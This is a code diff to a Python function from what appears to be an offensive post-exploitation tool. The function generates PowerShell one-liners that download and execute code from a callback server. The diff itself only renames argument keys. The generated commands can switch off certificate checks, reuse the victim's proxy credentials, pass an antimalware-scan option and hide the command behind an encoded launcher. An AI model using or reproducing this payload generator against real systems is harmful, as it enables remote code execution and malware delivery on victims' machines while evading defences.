@@ -113,47 +113,47 @@ endpoints = {
 
 def build_cradle(get_args, flavor="hub"):
     result = ""
-    if get_args['GroupTransport'] == 'https':
-        if get_args['RadioNoVerification'] == 'true':
+    if get_args['Transport'] == 'https':
+        if get_args['NoVerification'] == 'true':
             result += ("[System.Net.ServicePointManager]::ServerCertificate"
                        "ValidationCallback={$true};")
-        elif get_args['RadioFingerprint'] == 'true':
+        elif get_args['Fingerprint'] == 'true':
             from powerhub.reverseproxy import FINGERPRINT
             result += ("[System.Net.ServicePointManager]::ServerCertificate"
                        "ValidationCallback={param($1,$2);"
                        "$2.Thumbprint -eq '%s'};" %
                        FINGERPRINT.replace(':', ''))
-        elif get_args['RadioCertStore'] == 'true':
+        elif get_args['CertStore'] == 'true':
             pass
-        if get_args['CheckboxTLS1.2'] == 'true':
+        if get_args['TLS1.2'] == 'true':
             result += ("[Net.ServicePointManager]::SecurityProtocol="
                        "[Net.SecurityProtocolType]::Tls12;")
 
-    if get_args['GroupTransport'].startswith('http'):
+    if get_args['Transport'].startswith('http'):
         result += "$K=New-Object Net.WebClient;"
-        if get_args['CheckboxProxy'] == 'true':
+        if get_args['Proxy'] == 'true':
             result += ("$K.Proxy=[Net.WebRequest]::GetSystemWebProxy();"
                        "$K.Proxy.Credentials=[Net.CredentialCache]::"
                        "DefaultCredentials;")
-        if not get_args['GroupClipExec'] == 'none':
-            clip_exec = "&c=%s" % get_args['GroupClipExec']
+        if not get_args['ClipExec'] == 'none':
+            clip_exec = "&c=%s" % get_args['ClipExec']
         else:
             clip_exec = ""
         result += "IEX $K.DownloadString('%s0?t=%s&f=%s&a=%s%s');"
         result = result % (
-            callback_urls[get_args['GroupTransport']],
-            get_args['GroupTransport'],
+            callback_urls[get_args['Transport']],
+            get_args['Transport'],
             endpoints[flavor],
-            get_args['GroupAmsi'],
+            get_args['Amsi'],
             clip_exec,
         )
 
-    if get_args['GroupLauncher'] == 'cmd':
+    if get_args['Launcher'] == 'cmd':
         result = 'powershell.exe "%s"' % result
-    elif get_args['GroupLauncher'] == 'cmd_enc':
+    elif get_args['Launcher'] == 'cmd_enc':
         result = 'powershell.exe -Enc %s' % \
             binascii.b2a_base64(result.encode('utf-16le')).decode()
-    elif get_args['GroupLauncher'] == 'bash':
+    elif get_args['Launcher'] == 'bash':
         result = result.replace('$', '\\$')
         result = '"powershell.exe \\\"%s\\\""' % result
     return result
